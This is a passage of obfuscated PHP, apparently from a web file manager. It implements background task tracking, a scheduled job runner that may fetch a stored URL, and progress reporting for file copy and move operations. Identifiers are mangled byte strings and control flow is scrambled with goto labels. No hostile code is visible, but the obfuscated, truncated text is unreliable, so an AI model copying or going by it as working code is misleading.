$bÊ„Üš­ä =& $_SERVER[”Ì÷ñ­î¸]; self::log($bÊ„Üš­ä[1424] . $Fİóò¾ù›[$bÊ„Üš­ä[367]] . $bÊ„Üš­ä[1425] . $Fİóò¾ù›[$bÊ„Üš­ä[28]] . $bÊ„Üš­ä[1426] . $Fİóò¾ù›[$bÊ„Üš­ä[1427]]); Model($bÊ„Üš­ä[1410])->run($Fİóò¾ù›[$bÊ„Üš­ä[367]]); goto BŠøğ¤·; BŠøğ¤·: $FÏŠé›­Ë” = timeFloat(); $AÄš„Éõ™Î = $bÊ„Üš­ä[33]; switch ($Fİóò¾ù›[$bÊ„Üš­ä[29]]) { case $bÊ„Üš­ä[295]: $aáŒó´ÌÕÃ = url_request($Fİóò¾ù›[$bÊ„Üš­ä[1427]], $bÊ„Üš­ä[216], !1, !1, !1, !1, 5); $AÄš„Éõ™Î = strlen($aáŒó´ÌÕÃ); break; case $bÊ„Üš­ä[215]: $AÄš„Éõ™Î = Hook::apply($Fİóò¾ù›[$bÊ„Üš­ä[1427]]); default: break; } goto fòØ‰ä…à; fòØ‰ä…à: Model($bÊ„Üš­ä[1428])->add(array($bÊ„Üš­ä[1429] => $bÊ„Üš­ä[33], $bÊ„Üš­ä[1430] => $bÊ„Üš­ä[468], $bÊ„Üš­ä[29] => $bÊ„Üš­ä[1431] . $Fİóò¾ù›[$bÊ„Üš­ä[367]], $bÊ„Üš­ä[1432] => json_encode(array($bÊ„Üš­ä[28] => $Fİóò¾ù›[$bÊ„Üš­ä[28]], $bÊ„Üš­ä[1433] => timeFloat() - $FÏŠé›­Ë”, $bÊ„Üš­ä[281] => $AÄš„Éõ™Î)))); self::log($bÊ„Üš­ä[1434] . $Fİóò¾ù›[$bÊ„Üš­ä[367]] . $bÊ„Üš­ä[1435] . $AÄš„Éõ™Î); return !0; goto A«†öİËÆ–; A«†öİËÆ–: } private static function valueGet($e–¶ˆ¿¦„¬) { $eÄ›Ì‡ÂŒô =& $_SERVER[”Ì÷ñ­î¸]; $B£Ó’•×Â³ = $eÄ›Ì‡ÂŒô[1436]; $BĞº…‘õÃ÷ = Model($eÄ›Ì‡ÂŒô[1437])->get($e–¶ˆ¿¦„¬, $B£Ó’•×Â³); if (is_null($BĞº…‘õÃ÷)) { Model($eÄ›Ì‡ÂŒô[1437])->set($eÄ›Ì‡ÂŒô[1408], 10, $B£Ó’•×Â³); Model($eÄ›Ì‡ÂŒô[1437])->set($eÄ›Ì‡ÂŒô[690], $eÄ›Ì‡ÂŒô[83], $B£Ó’•×Â³); Model($eÄ›Ì‡ÂŒô[1437])->set($eÄ›Ì‡ÂŒô[1403], $eÄ›Ì‡ÂŒô[468], $B£Ó’•×Â³); $BĞº…‘õÃ÷ = Model($eÄ›Ì‡ÂŒô[1437])->get($e–¶ˆ¿¦„¬, $B£Ó’•×Â³); } return $BĞº…‘õÃ÷; } private static function valueSet($aééºÑ‡š, $CŞ‚²µÚ¿è) { $cÂÖ¨ªŒ˜ù =& $_SERVER[”Ì÷ñ­î¸]; return Model($cÂÖ¨ªŒ˜ù[1437])->set($aééºÑ‡š, $CŞ‚²µÚ¿è, $cÂÖ¨ªŒ˜ù[1436]); } protected static function log($E‘’ÍÓãê†) { write_log($E‘’ÍÓãê†, $_SERVER[”Ì÷ñ­î¸][1438]); } private static function cacheClear() { $bÙÀ„½ÀÊÇ =& $_SERVER[”Ì÷ñ­î¸]; $E••‡Èù¥ = Model($bÙÀ„½ÀÊÇ[1437])->cacheKey($bÙÀ„½ÀÊÇ[1436]); Cache::clearMemory($E••‡Èù¥); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\162\165\x6e\156\x69\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($Eã„Õ¢ãöæ, $d²©ëÀÃí› = '', $fğˆ‚—ŸçÀ = 0, $aŠ°‚ø¼ˆ = '') { goto eÒíØÇÔ; eÒíØÇÔ: $d––‰ƒ‘ñ =& $_SERVER[”Ì÷ñ­î¸]; if (self::get($Eã„Õ¢ãöæ)) { return; } $this->task = array($d––‰ƒ‘ñ[367] => $Eã„Õ¢ãöæ, $d––‰ƒ‘ñ[1439] => USER_ID, $d––‰ƒ‘ñ[1344] => $aŠ°‚ø¼ˆ, $d––‰ƒ‘ñ[29] => $d²©ëÀÃí›, $d––‰ƒ‘ñ[980] => $d––‰ƒ‘ñ[33], $d––‰ƒ‘ñ[978] => $fğˆ‚—ŸçÀ, $d––‰ƒ‘ñ[990] => 0, $d––‰ƒ‘ñ[1440] => 0, $d––‰ƒ‘ñ[1441] => 0, $d––‰ƒ‘ñ[1442] => timeFloat(), $d––‰ƒ‘ñ[1443] => 0, $d––‰ƒ‘ñ[1444] => 0, $d––‰ƒ‘ñ[1445] => 0, $d––‰ƒ‘ñ[1446] => 0, $d––‰ƒ‘ñ[690] => $d––‰ƒ‘ñ[1403]); goto fÂÖÑ…‹¡”; b²‘Ï —¹´: Hook::trigger($d––‰ƒ‘ñ[1450], $this->task); $this->task[$d––‰ƒ‘ñ[1444]] = timeFloat(); goto D‡›‰Ï£‚´; fÂÖÑ…‹¡”: Hook::bind($d––‰ƒ‘ñ[1405], array($this, $d––‰ƒ‘ñ[1447])); Hook::bind($d––‰ƒ‘ñ[1448], array($this, $d––‰ƒ‘ñ[1449])); $this->startAfter(); goto b²‘Ï —¹´; D‡›‰Ï£‚´: } public function end() { goto b Ÿ‘ß¼ø; Aâõó¨ĞÄÕ: Hook::unbind($eî§„¯®É…[1448], array($this, $eî§„¯®É…[1449])); $this->endAfter(); $this->task = !1; goto C¢±‰ö‹Š†; b Ÿ‘ß¼ø: $eî§„¯®É… =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->task) { return; } if ($this->task[$eî§„¯®É…[1444]]) { self::valueSet($this->task[$eî§„¯®É…[367]], !1); } goto CÛØ½ĞĞù‘; CÛØ½ĞĞù‘: $E£…Öœæ = timeFloat() - $this->task[$eî§„¯®É…[1442]]; self::log($eî§„¯®É…[1451] . $this->task[$eî§„¯®É…[367]] . $eî§„¯®É…[1452] . $E£…Öœæ . $eî§„¯®É…[1453]); Hook::unbind($eî§„¯®É…[1405], array($this, $eî§„¯®É…[1447])); goto Aâõó¨ĞÄÕ; C¢±‰ö‹Š†: } public function update($Dó¶©Ô = 0) { goto eÊ›ßœó¤Ü; eùáô±ˆù: $F×«¡ÉŠ·ˆ[$bñ·…Ã…[690]] = $DÊ½‚ğå ? $DÊ½‚ğå : $F×«¡ÉŠ·ˆ[$bñ·…Ã…[690]]; $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1445]] = $Fğ´äÀä[$bñ·…Ã…[1445]] ? $Fğ´äÀä[$bñ·…Ã…[1445]] : 0; $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1444]] = timeFloat(); goto cœâ¾¿˜ùñ; FÎÛÃ¹Ñµ: $F×«¡ÉŠ·ˆ[$bñ·…Ã…[990]] += $Dó¶©Ô; $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1443]] = timeFloat(); if ($F×«¡ÉŠ·ˆ[$bñ·…Ã…[978]]) { if ($F×«¡ÉŠ·ˆ[$bñ·…Ã…[978]] < $F×«¡ÉŠ·ˆ[$bñ·…Ã…[990]]) { $F×«¡ÉŠ·ˆ[$bñ·…Ã…[978]] = $F×«¡ÉŠ·ˆ[$bñ·…Ã…[990]]; } $d±Ó…ÌôŒ = timeFloat() - $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1442]] - $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1445]]; $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1440]] = $F×«¡ÉŠ·ˆ[$bñ·…Ã…[990]] / $F×«¡ÉŠ·ˆ[$bñ·…Ã…[978]]; $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1441]] = $F×«¡ÉŠ·ˆ[$bñ·…Ã…[990]] / $d±Ó…ÌôŒ; if ($F×«¡ÉŠ·ˆ[$bñ·…Ã…[1440]] > 0) { $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1446]] = $d±Ó…ÌôŒ * (1 - $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1440]]) / $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1440]]; } $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1446]] = $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1446]] <= 0 ? 0 : $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1446]]; } goto FÚš‹®ùÄœ; cœâ¾¿˜ùñ: Hook::trigger($bñ·…Ã…[1457], $F×«¡ÉŠ·ˆ); self::valueSet($F×«¡ÉŠ·ˆ[$bñ·…Ã…[367]], $F×«¡ÉŠ·ˆ); goto fİ¯×ŸÊœÉ; cë–‚ˆ°…: $Fğ´äÀä = self::get($F×«¡ÉŠ·ˆ[$bñ·…Ã…[367]]); $DÊ½‚ğå = $Fğ´äÀä[$bñ·…Ã…[690]]; if ($DÊ½‚ğå == self::STATYS_KILL) { $f”ßÒÛ«¼Ş = array($bñ·…Ã…[1454] => LNG($bñ·…Ã…[1455]), $bñ·…Ã…[1032] => !1); Cache::set($bñ·…Ã…[1456] . $this->task[$bñ·…Ã…[367]], $f”ßÒÛ«¼Ş, 30); $this->end(); die; } else { if ($DÊ½‚ğå == self::STATYS_STOP) { $A—Ò¡ë¾¾ = 2; $Fğ´äÀä[$bñ·…Ã…[1445]] += $A—Ò¡ë¾¾; self::valueSet($F×«¡ÉŠ·ˆ[$bñ·…Ã…[367]], $Fğ´äÀä); sleep($A—Ò¡ë¾¾); $this->update(); return; } } goto eùáô±ˆù; FÚš‹®ùÄœ: $this->updateAfter(); $eõÑªœ“†± = 0.2; if (timeFloat() - $F×«¡ÉŠ·ˆ[$bñ·…Ã…[1444]] < $eõÑªœ“†±) { return; } goto cë–‚ˆ°…; eÊ›ßœó¤Ü: $bñ·…Ã… =& $_SERVER[”Ì÷ñ­î¸]; $F×«¡ÉŠ·ˆ =& $this->task; if (!$F×«¡ÉŠ·ˆ) { return; } goto FÎÛÃ¹Ñµ; fİ¯×ŸÊœÉ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($A¢”¾ÓÙ¥°) { $FÙöˆËá’Ã =& $_SERVER[”Ì÷ñ­î¸]; Cache::set($FÙöˆËá’Ã[1456] . $this->task[$FÙöˆËá’Ã[367]], $A¢”¾ÓÙ¥°, 60); return $A¢”¾ÓÙ¥°; } public static function get($B„¯ğ¥ÊÀ) { return self::valueGet($B„¯ğ¥ÊÀ); } public static function listData() { $EÛ”‘øˆ½Ä = self::valueGet(); return array_sort_by($EÛ”‘øˆ½Ä, $_SERVER[”Ì÷ñ­î¸][1442], !0); } public static function kill($bŸÜÌ®ÑÑƒ) { return self::changeStatus($bŸÜÌ®ÑÑƒ, self::STATYS_KILL); } public static function stop($cœ’ ¥Ì) { return self::changeStatus($cœ’ ¥Ì, self::STATYS_STOP); } public static function restart($F¼äÏ¦Ÿ…) { return self::changeStatus($F¼äÏ¦Ÿ…, self::STATYS_RUNNING); } public static function killAll() { $eòÙÊ£ÖĞ“ =& $_SERVER[”Ì÷ñ­î¸]; $aæ¦Àœí¬ = self::listData(); foreach ($aæ¦Àœí¬ as $dòèåœê±Ì) { self::kill($dòèåœê±Ì[$eòÙÊ£ÖĞ“[367]]); } sleep(2); foreach ($aæ¦Àœí¬ as $dòèåœê±Ì) { self::valueSet($dòèåœê±Ì[$eòÙÊ£ÖĞ“[367]], !1); } } private static function changeStatus($b®õ’Û•®, $bè«˜Š‚Ò) { goto fÚİø¦˜¦; b»¨Şİ×¬ª: return !0; goto BÖ™¸­òÄ; fÚİø¦˜¦: $B„Ñ³ÂÃ‰Æ =& $_SERVER[”Ì÷ñ­î¸]; $dêŠíÈËÏŠ = self::valueGet($b®õ’Û•®); if (!$dêŠíÈËÏŠ) { return !1; } goto fâ§¢¾‹‡; fâ§¢¾‹‡: $dêŠíÈËÏŠ[$B„Ñ³ÂÃ‰Æ[690]] = $bè«˜Š‚Ò; self::valueSet($b®õ’Û•®, $dêŠíÈËÏŠ); self::log($B„Ñ³ÂÃ‰Æ[1458] . $dêŠíÈËÏŠ[$B„Ñ³ÂÃ‰Æ[367]] . $B„Ñ³ÂÃ‰Æ[1459] . $bè«˜Š‚Ò); goto b»¨Şİ×¬ª; BÖ™¸­òÄ: } public static function valueGet($aê†¢Ò¼¾§ = false) { $fÆ™ÛÌÒİ =& $_SERVER[”Ì÷ñ­î¸]; if ($aê†¢Ò¼¾§) { $F²ÁÔ²Ø¨ = Model($fÆ™ÛÌÒİ[399])->where(array($fÆ™ÛÌÒİ[89] => $aê†¢Ò¼¾§, $fÆ™ÛÌÒİ[29] => $fÆ™ÛÌÒİ[1460]))->find(); return $F²ÁÔ²Ø¨ ? json_decode($F²ÁÔ²Ø¨[$fÆ™ÛÌÒİ[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($D¨ğ™ÙŠ† = false) { goto D—¾»®‹¬İ; d…¿š´Â´: $BÏ¾÷¶ô›Š = Model($E˜ªå³ø÷[399])->where($AÇİÚ†§è)->select(); $BÏ¾÷¶ô›Š = $BÏ¾÷¶ô›Š ? $BÏ¾÷¶ô›Š : array(); foreach ($BÏ¾÷¶ô›Š as $b‘ŞˆèÊâì => $Fà«â¬øÕ¦) { $BÏ¾÷¶ô›Š[$b‘ŞˆèÊâì] = json_decode($Fà«â¬øÕ¦[$E˜ªå³ø÷[359]], !0); } goto cÊÅ½ Ë¹Ğ; cÊÅ½ Ë¹Ğ: return $BÏ¾÷¶ô›Š; goto dä¸íèÛæ‘; D—¾»®‹¬İ: $E˜ªå³ø÷ =& $_SERVER[”Ì÷ñ­î¸]; $AÇİÚ†§è = array($E˜ªå³ø÷[29] => $E˜ªå³ø÷[1460]); if ($D¨ğ™ÙŠ†) { $AÇİÚ†§è[$E˜ªå³ø÷[1439]] = $D¨ğ™ÙŠ†; } goto d…¿š´Â´; dä¸íèÛæ‘: } public static function valueSet($B›î…ğÂ‹ò, $b·–ãÒãÇ„) { goto FÑŠšõÇ; FÑŠšõÇ: $BàÉˆÒê˜Õ =& $_SERVER[”Ì÷ñ­î¸]; if (!$b·–ãÒãÇ„) { return Model($BàÉˆÒê˜Õ[399])->where(array($BàÉˆÒê˜Õ[89] => $B›î…ğÂ‹ò, $BàÉˆÒê˜Õ[29] => $BàÉˆÒê˜Õ[1460]))->delete(); } $b¹›ÄË–¦ = json_encode($b·–ãÒãÇ„); goto E¸…‚ˆ¼æ; B‚ë—­âÉ : Model($BàÉˆÒê˜Õ[399])->add($DŒ­’‹œ¥, array(), !0); goto AÎÅ†–ƒ¯È; E¸…‚ˆ¼æ: if (!$b¹›ÄË–¦) { ob_start(); var_dump($b·–ãÒãÇ„); $b×¯©Š×ÈÃ = ob_get_clean(); self::log($BàÉˆÒê˜Õ[1461] . json_encode_force($b×¯©Š×ÈÃ)); } if (!$B›î…ğÂ‹ò || !$b·–ãÒãÇ„[$BàÉˆÒê˜Õ[367]]) { return !1; } $DŒ­’‹œ¥ = array($BàÉˆÒê˜Õ[29] => $BàÉˆÒê˜Õ[1460], $BàÉˆÒê˜Õ[1439] => USER_ID, $BàÉˆÒê˜Õ[89] => $B›î…ğÂ‹ò, $BàÉˆÒê˜Õ[359] => $b¹›ÄË–¦); goto B‚ë—­âÉ ; AÎÅ†–ƒ¯È: } public static function log($e¹ÀÌ¸îÒ™) { write_log($e¹ÀÌ¸îÒ™, $_SERVER[”Ì÷ñ­î¸][1462]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto d´Áâ Ûğ‰; d´Áâ Ûğ‰: $f“­ ¥ê¨» =& $_SERVER[”Ì÷ñ­î¸]; $d»¨ö×Ü =& $this->task; $this->sourceCopyFolder = !1; goto fœ«Ü¤ßŞ; då‰¥Ô¾å: Hook::bind($f“­ ¥ê¨»[511], array($this, $f“­ ¥ê¨»[1472])); Hook::bind($f“­ ¥ê¨»[513], array($this, $f“­ ¥ê¨»[1472])); Hook::bind($f“­ ¥ê¨»[515], array($this, $f“­ ¥ê¨»[1472])); goto c¢§ç‘Õ×ª; dß…™®Ëî: $d»¨ö×Ü[$f“­ ¥ê¨»[1488]] = 0; $d»¨ö×Ü[$f“­ ¥ê¨»[1489]] = 0; if (!$d»¨ö×Ü[$f“­ ¥ê¨»[1344]]) { $d»¨ö×Ü[$f“­ ¥ê¨»[1344]] = LNG($f“­ ¥ê¨»[1490]); } goto a±Áˆå‚Ãó; BÊ¯´Šİ: Hook::bind($f“­ ¥ê¨»[539], array($this, $f“­ ¥ê¨»[1469])); Hook::bind($f“­ ¥ê¨»[540], array($this, $f“­ ¥ê¨»[1470])); Hook::bind($f“­ ¥ê¨»[542], array($this, $f“­ ¥ê¨»[1471])); goto bÖ¼õ·³¬­; bÖ¼õ·³¬­: Hook::bind($f“­ ¥ê¨»[543], array($this, $f“­ ¥ê¨»[1471])); Hook::bind($f“­ ¥ê¨»[509], array($this, $f“­ ¥ê¨»[1472])); Hook::bind($f“­ ¥ê¨»[506], array($this, $f“­ ¥ê¨»[1472])); goto då‰¥Ô¾å; c¢§ç‘Õ×ª: Hook::bind($f“­ ¥ê¨»[1473], array($this, $f“­ ¥ê¨»[1474])); Hook::bind($f“­ ¥ê¨»[532], array($this, $f“­ ¥ê¨»[1475])); $this->sourceModelCopyFlag = !1; goto cñÍò¬Œºæ; BÓíˆ±Ÿ: $d»¨ö×Ü[$f“­ ¥ê¨»[1482]] = LNG($f“­ ¥ê¨»[1483]); $d»¨ö×Ü[$f“­ ¥ê¨»[1484]] = 0; $d»¨ö×Ü[$f“­ ¥ê¨»[1485]] = 0; goto AÄ¨¶˜İäÏ; cñÍò¬Œºæ: Hook::bind($f“­ ¥ê¨»[1476], array($this, $f“­ ¥ê¨»[1477])); Hook::bind($f“­ ¥ê¨»[1478], array($this, $f“­ ¥ê¨»[1479])); Hook::bind($f“­ ¥ê¨»[1480], array($this, $f“­ ¥ê¨»[1481])); goto BÓíˆ±Ÿ; AÄ¨¶˜İäÏ: $d»¨ö×Ü[$f“­ ¥ê¨»[980]] = $f“­ ¥ê¨»[33]; $d»¨ö×Ü[$f“­ ¥ê¨»[1486]] = $f“­ ¥ê¨»[33]; $d»¨ö×Ü[$f“­ ¥ê¨»[1487]] = 0; goto dß…™®Ëî; fœ«Ü¤ßŞ: Hook::bind($f“­ ¥ê¨»[1463], array($this, $f“­ ¥ê¨»[1464])); Hook::bind($f“­ ¥ê¨»[1465], array($this, $f“­ ¥ê¨»[1466])); Hook::bind($f“­ ¥ê¨»[1467], array($this, $f“­ ¥ê¨»[1468])); goto BÊ¯´Šİ; a±Áˆå‚Ãó: } protected function endAfter() { goto F÷µÊ÷’øÜ; Bèöä‹ÁÃê: Hook::unbind($AÆÖºÃ‘ƒ[542], array($this, $AÆÖºÃ‘ƒ[1471])); Hook::unbind($AÆÖºÃ‘ƒ[543], array($this, $AÆÖºÃ‘ƒ[1471])); Hook::unbind($AÆÖºÃ‘ƒ[509], array($this, $AÆÖºÃ‘ƒ[1472])); goto bÒ§«™ˆ¹´; c’£‘Ÿ¦¿Ú: Hook::unbind($AÆÖºÃ‘ƒ[515], array($this, $AÆÖºÃ‘ƒ[1472])); Hook::unbind($AÆÖºÃ‘ƒ[1473], array($this, $AÆÖºÃ‘ƒ[1474])); Hook::unbind($AÆÖºÃ‘ƒ[532], array($this, $AÆÖºÃ‘ƒ[1475])); goto eŸÆ¦¿Ü˜Ğ; bÒ§«™ˆ¹´: Hook::unbind($AÆÖºÃ‘ƒ[506], array($this, $AÆÖºÃ‘ƒ[1472])); Hook::unbind($AÆÖºÃ‘ƒ[511], array($this, $AÆÖºÃ‘ƒ[1472])); Hook::unbind($AÆÖºÃ‘ƒ[513], array($this, $AÆÖºÃ‘ƒ[1472])); goto c’£‘Ÿ¦¿Ú; Eøà–‹¢Ÿç: Hook::unbind($AÆÖºÃ‘ƒ[1467], array($this, $AÆÖºÃ‘ƒ[1468])); Hook::unbind($AÆÖºÃ‘ƒ[539], array($this, $AÆÖºÃ‘ƒ[1469])); Hook::unbind($AÆÖºÃ‘ƒ[540], array($this, $AÆÖºÃ‘ƒ[1470])); goto Bèöä‹ÁÃê; F÷µÊ÷’øÜ: $AÆÖºÃ‘ƒ =& $_SERVER[”Ì÷ñ­î¸]; Hook::unbind($AÆÖºÃ‘ƒ[1463], array($this, $AÆÖºÃ‘ƒ[1464])); Hook::unbind($AÆÖºÃ‘ƒ[1465], array($this, $AÆÖºÃ‘ƒ[1466])); goto Eøà–‹¢Ÿç; eŸÆ¦¿Ü˜Ğ: Hook::unbind($AÆÖºÃ‘ƒ[1476], array($this, $AÆÖºÃ‘ƒ[1477])); Hook::unbind($AÆÖºÃ‘ƒ[1478], array($this, $AÆÖºÃ‘ƒ[1479])); Hook::unbind($AÆÖºÃ‘ƒ[1480], array($this, $AÆÖºÃ‘ƒ[1481])); goto dÑ˜ĞƒáÓñ; dÑ˜ĞƒáÓñ: } public function copyMoveStart($d¨·ˆÒˆ, $Eëß–Ô‡ƒ£, $F±·ÍÛ°¿, $dÍÜáò×Éğ) { goto BêÔºø¢ƒÛ; DÔÔ«´˜Ò: $F¿Œ¢…£Ì[$e—™øÃ“Š½[1492]] = KodIO::transferType($d¨·ˆÒˆ, $F±·ÍÛ°¿); $this->update(); goto dÈÊÜ°‚¹; BêÔºø¢ƒÛ: $e—™øÃ“Š½ =& $_SERVER[”Ì÷ñ­î¸]; self::log($e—™øÃ“Š½[1491] . $Eëß–Ô‡ƒ£ . $e—™øÃ“Š½[66] . $dÍÜáò×Éğ); $b¤ÕïÁ¿İ = rtrim(TEMP_FILES, $e—™øÃ“Š½[8]); goto eŒÈêÌ­¦Á; eŒÈêÌ­¦Á: if (substr($Eëß–Ô‡ƒ£, 0, strlen($b¤ÕïÁ¿İ)) == $b¤ÕïÁ¿İ) { return; } if (substr($dÍÜáò×Éğ, 0, strlen($b¤ÕïÁ¿İ)) == $b¤ÕïÁ¿İ) { return; } $F¿Œ¢…£Ì =& $this->task; goto DÔÔ«´˜Ò; dÈÊÜ°‚¹: } public function updateAfter() { goto EØÈìµºí; aõ¢áàµ‘: $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1440]] = $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1489]] / $a©¶É¥ÁÊÈ[$AÑìâ×òğ[699]]; if ($a©¶É¥ÁÊÈ[$AÑìâ×òğ[1440]] > 0) { $f„‘®ë = timeFloat() - $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1442]] - $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1445]]; $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1446]] = $f„‘®ë * (1 - $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1440]]) / $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1440]]; } goto DÅ­•³„ôê; EØÈìµºí: $AÑìâ×òğ =& $_SERVER[”Ì÷ñ­î¸]; $a©¶É¥ÁÊÈ =& $this->task; if (!$a©¶É¥ÁÊÈ[$AÑìâ×òğ[699]]) { return; } goto F³ëÈïŠæœ; F³ëÈïŠæœ: if ($this->sourceModelCopyFlag) { return; } if ($a©¶É¥ÁÊÈ[$AÑìâ×òğ[1492]] == $AÑìâ×òğ[1094]) { return; } if ($a©¶É¥ÁÊÈ[$AÑìâ×òğ[1492]] == $AÑìâ×òğ[1040] || $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1492]] == $AÑìâ×òğ[103]) { if ($a©¶É¥ÁÊÈ[$AÑìâ×òğ[1486]]) { $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1489]] = $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1488]] + $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1485]]; } } else { if ($a©¶É¥ÁÊÈ[$AÑìâ×òğ[1492]] == $AÑìâ×òğ[1095]) { if ($a©¶É¥ÁÊÈ[$AÑìâ×òğ[1486]] == $AÑìâ×òğ[1040]) { $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1489]] = $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1488]] + $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1485]] * 0.5; } else { if ($a©¶É¥ÁÊÈ[$AÑìâ×òğ[1486]] == $AÑìâ×òğ[103]) { $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1489]] = $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1488]] + $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1484]] * 0.5 + $a©¶É¥ÁÊÈ[$AÑìâ×òğ[1485]] * 0.5; } } } } goto aõ¢áàµ‘; DÅ­•³„ôê: } public function addPath($cÓåò‘“Ìö) { goto dšïï¤º; eš¨ÛÁšŠÔ: if ($DÔŠéğÔµ¾[$C³Î Ô©¤±[29]] == $C³Î Ô©¤±[167]) { $c›¸‰¬Èº‰[$C³Î Ô©¤±[978]] += 1; } else { $c›¸‰¬Èº‰[$C³Î Ô©¤±[978]] += $DÔŠéğÔµ¾[$C³Î Ô©¤±[80]][$C³Î Ô©¤±[78]]; if ($DÔŠéğÔµ¾[$C³Î Ô©¤±[369]]) { $c›¸‰¬Èº‰[$C³Î Ô©¤±[978]] += $DÔŠéğÔµ¾[$C³Î Ô©¤±[80]][$C³Î Ô©¤±[79]] + 1; } } $c›¸‰¬Èº‰[$C³Î Ô©¤±[699]] += $DÔŠéğÔµ¾[$C³Î Ô©¤±[77]]; $this->update(); goto e…é¯„¸“; FİÛÜ›¤Ÿ: $DÔŠéğÔµ¾ = IO::infoWithChildren($cÓåò‘“Ìö); $Aëƒå¸Œ‰† = $c›¸‰¬Èº‰[$C³Î Ô©¤±[1493]] ? $c›¸‰¬Èº‰[$C³Î Ô©¤±[1493]][$C³Î Ô©¤±[1494]] : 0; $c›¸‰¬Èº‰[$C³Î Ô©¤±[1493]] = array($C³Î Ô©¤±[1494] => $Aëƒå¸Œ‰† + 1, $C³Î Ô©¤±[386] => $DÔŠéğÔµ¾[$C³Î Ô©¤±[28]], $C³Î Ô©¤±[75] => $DÔŠéğÔµ¾[$C³Î Ô©¤±[75]], $C³Î Ô©¤±[466] => $DÔŠéğÔµ¾[$C³Î Ô©¤±[466]] ? $DÔŠéğÔµ¾[$C³Î Ô©¤±[466]] : $DÔŠéğÔµ¾[$C³Î Ô©¤±[75]]); goto eš¨ÛÁšŠÔ; dšïï¤º: $C³Î Ô©¤± =& $_SERVER[”Ì÷ñ­î¸]; if (!$cÓåò‘“Ìö) { return; } $c›¸‰¬Èº‰ =& $this->task; goto FİÛÜ›¤Ÿ; e…é¯„¸“: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($A¢¥£èŒµ) { $Fæø©»ª—³ =& $_SERVER[”Ì÷ñ­î¸]; $Cî‰Ô»¨è© =& $this->task; $Cî‰Ô»¨è©[$Fæø©»ª—³[1482]] = $A¢¥£èŒµ[$Fæø©»ª—³[28]]; $Cî‰Ô»¨è©[$Fæø©»ª—³[980]] = $A¢¥£èŒµ[$Fæø©»ª—³[28]]; $this->update(); } public function copyFileStart($eçœê÷Ëƒ, $Cî’İ’‹ —, $E£õÊ—™½, $Cæè±ª¶Ü¥, $bÖÏâ¨¨ÏÅ, $aâß®ƒ©Úó) { goto A‚Œ‹Œ®íÑ; E»œ£Ú£Šî: $GLOBALS[$B†›£ÕàÊŞ[1496]] = $bÖÏâ¨¨ÏÅ; $GLOBALS[$B†›£ÕàÊŞ[1495]] = $aâß®ƒ©Úó; $DŞ’¸Š¤Ùƒ =& $this->task; goto fô…Œ×‡‘; Föµá±Ş‡¸: $this->update(); goto fÜæ†â¹İÄ; bŞ½çĞó¥‹: $DŞ’¸Š¤Ùƒ[$B†›£ÕàÊŞ[980]] = $B†›£ÕàÊŞ[33]; $DŞ’¸Š¤Ùƒ[$B†›£ÕàÊŞ[1486]] = $B†›£ÕàÊŞ[33]; $DŞ’¸Š¤Ùƒ[$B†›£ÕàÊŞ[1487]] = 0; goto Föµá±Ş‡¸; A‚Œ‹Œ®íÑ: $B†›£ÕàÊŞ =& $_SERVER[”Ì÷ñ­î¸]; $DÀ¥î†åê = $bÖÏâ¨¨ÏÅ; if ($DÀ¥î†åê == $GLOBALS[$B†›£ÕàÊŞ[1495]]) { $DÀ¥î†åê = $GLOBALS[$B†›£ÕàÊŞ[1496]]; } goto E»œ£Ú£Šî; fô…Œ×‡‘: $DŞ’¸Š¤Ùƒ[$B†›£ÕàÊŞ[1482]] = $DÀ¥î†åê; $DŞ’¸Š¤Ùƒ[$B†›£ÕàÊŞ[1484]] = (int) $eçœê÷Ëƒ->size($Cî’İ’‹ —); $DŞ’¸Š¤Ùƒ[$B†›£ÕàÊŞ[1485]] = 0; goto bŞ½çĞó¥‹; fÜæ†â¹İÄ: } public function copyFileEnd($Bà¢÷ÊÅô, $c¯ÍõóäÑ, $cˆÉæØÛù, $B¿Èá«öÊ·, $Bœ«ò¢¢ÎÄ, $Bì²Œ°Œ¹â) { $b¼ŞÄ¨Ãïá =& $_SERVER[”Ì÷ñ­î¸]; $EÊéõºˆ =& $this->task; $EÊéõºˆ[$b¼ŞÄ¨Ãïá[1485]] = $EÊéõºˆ[$b¼ŞÄ¨Ãïá[1484]]; $EÊéõºˆ[$b¼ŞÄ¨Ãïá[1486]] = $b¼ŞÄ¨Ãïá[33]; if ($Bœ«ò¢¢ÎÄ == $EÊéõºˆ[$b¼ŞÄ¨Ãïá[1482]]) { 